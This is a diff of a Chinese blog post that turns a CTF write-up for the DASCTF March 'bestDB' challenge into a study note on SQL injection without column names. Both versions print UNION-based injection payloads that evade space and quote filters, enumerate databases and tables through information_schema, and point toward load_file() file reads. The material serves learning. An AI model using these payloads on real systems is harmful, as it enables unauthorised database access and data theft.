@@ -1,78 +1,29 @@
 ---
-title: DASCTF三月赛
+title: SQL无列名注入
 comments: true
 hide: false
 date: 2021-03-29 19:17:53
 urlname: mardasctf
-updated:
+updated: 2021-04-20 16:17:53
 password:
 tags:
   - SQL
-categories: Write-Up
+categories: 
+  - 杂谈笔记
+  - 学习笔记
 ---
 
 
 
-队伍名称：err0rcm
+sql注入的姿势
 
 <!-- more -->
 
-我是菜鸡，每次比赛都缺点灵性。
-
-就做出来一题，当然准确来说也不算做出来，倒在了最后一步。反思...
-
-本人比较菜，详细写一下，给自己好好总结
-
-## WEB
-
-### bestDB
-
-> 由于电脑崩了:(  bp和网页都没了，只能凭我写了
-
-进去一个查询框，题目名字有db，肯定是注入了。
-
-注释中发现hint
-
-```html
-<!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!>
-```
-
-这就建个数据库测试，经测试发现ban了空格和单引号，测试出了payload
-
-`-1"union/**/select/**/1,2,3"`
-
-![union](mardasctf/image-20210329193545757.png)
-
-回显位为1和2，改改以前的脚本，查数据库名
-
-```sql
--1"union/**/select/**/1,database(),3"
-
-# databases==========>users
-```
-
-查表名
-
-```sql
--1"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"
-
-# tables==========>f1agdas,users
-```
-
-无列名查询(其实直接查就好，本人复习一下之前的知识)
-
-```sql
--1"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"
-
-
-# data==========>flag.txt
-```
+以DASCTF三月赛为例，记录下无列名注入。
 
 
 
----
-
-#### 无列名查询
+## 无列名查询
 
 例如join进行无列名注入，现在有张表`table`如下
 
@@ -142,9 +93,60 @@ select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from `ta
 
 ![concat](mardasctf/image-20210329202408382.png)
 
+
+
 ---
 
-回到正题，查到`f1agdas`表里有个`flag.txt`，应该是利用`load_file()`函数读取文件，查了下用户
+以下是比赛WP
+
+### DASCTF三月赛·bestDB
+
+> 由于电脑崩了:(  bp和网页都没了，只能凭我写了
+
+进去一个查询框，题目名字有db，肯定是注入了。
+
+注释中发现hint
+
+```html
+<!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!>
+```
+
+这就建个数据库测试，经测试发现ban了空格和单引号，测试出了payload
+
+`-1"union/**/select/**/1,2,3"`
+
+![union](mardasctf/image-20210329193545757.png)
+
+回显位为1和2，改改以前的脚本，查数据库名
+
+```sql
+-1"union/**/select/**/1,database(),3"
+
+# databases==========>users
+```
+
+查表名
+
+```sql
+-1"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"
+
+# tables==========>f1agdas,users
+```
+
+无列名查询(其实直接查就好，本人复习一下之前的知识)
+
+```sql
+-1"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"
+
+
+# data==========>flag.txt
+```
+
+
+
+---
+
+查到`f1agdas`表里有个`flag.txt`，应该是利用`load_file()`函数读取文件，查了下用户
 
 ```sql
 -1"union/**/select/**/1,user(),3"
@@ -276,9 +278,9 @@ if __name__ == "__main__":
 
 经验不足，最后还是没能出这简单题。一方面也是平台的问题，实在太卡了:(
 
-数据库里写的`flag.txt`，最后却在根目录`/flag`。尝试过十六进制`/flag`读取，可能是因为太卡了，没成功就没再试了，以为就是`flag.txt`。盲猜有人拿到注入题直接sqlmap开始跑，导致服务器负载太大，或者说运维去三亚了2333
+数据库里写的`flag.txt`，最后却在根目录`/flag`。尝试过十六进制`/flag`读取，可能是因为太卡了，没成功就没再试了，以为就是`flag.txt`。盲猜有人拿到注入题直接sqlmap开始跑（因为之前我也干过），导致服务器负载太大，或者说运维去三亚了2333
 
-还尝试了读取一堆无用的东西，以为和 [[网鼎杯 2018]Comment](/article/Buuoj-WEB-Write-up/#Comment) 
+还尝试了读取一堆无用的东西，以为和 [[网鼎杯 2018]Comment](/article/Buuoj-WEB-Write-up/#Comment) 一样
 
 ```shell
 # @@datadir
